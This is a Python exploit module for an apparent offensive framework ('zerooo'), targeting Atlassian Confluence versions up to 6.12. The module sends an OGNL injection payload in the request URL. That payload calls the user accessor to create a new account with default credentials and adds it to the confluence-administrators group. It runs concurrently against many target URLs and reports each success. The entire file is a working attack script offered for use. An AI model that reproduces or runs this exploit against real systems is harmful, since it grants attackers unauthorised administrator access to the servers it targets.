from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.data import random_ua


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Confluence 任意用户添加',
            'Module': 'exploit/atlassian/confluence/add-any-user',
            'Product': 'Confluence',
            'Cve': '',
            'Create_date': '20220801',
            'Description': 'Confluence 任意用户添加 <= 6.12',
            'Authors': '',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'username': {'Current Setting': 'help1234', 'Required': 'no', 'Description': '创建的用户名'},
            'password': {'Current Setting': 'help@1234', 'Required': 'no', 'Description': '创建的用户密码'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'}
        }

    async def add_user(self, urls):
        username = self.get_options('username')
        password = self.get_options('password')
        payload = '''${{%23this.getUserAccessor().addUser('{0}','{1}','{2}Confluence.com','help',%40com.atlassian.confluence.util.GeneralUtil%40splitCommaDelimitedString("confluence-administrators,confluence-users"))}}/'''.format(
            username, password, username)
        vul_urls = urls + payload
        headers = {'User-Agent': random_ua(), 'Accept': 'application/json, text/javascript, */*; q=0.01',
                   'Accept-Language': 'en-US,en;q=0.5'}
        resp = await HttpClient().send_request_cgi('GET', headers=headers, url=vul_urls)
        return resp, username, password

    @staticmethod
    def add_user_callback(future):
        resp, username, password = future.result()
        if resp:
            if resp['code'] == 401:
                LOGGER.info(resp['url'])
                LOGGER.success(f'创建用户成功 (Create user success) : {username}, {password}')
            else:
                msg = f'目标不存在漏洞 (The target not find vuln): {resp["url"]}'
                LOGGER.info(msg)
        else:
            msg = f'目标不存在漏洞 (The target not find vuln): {resp["url"]}'
            LOGGER.info(msg)

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.add_user, urls, self.add_user_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
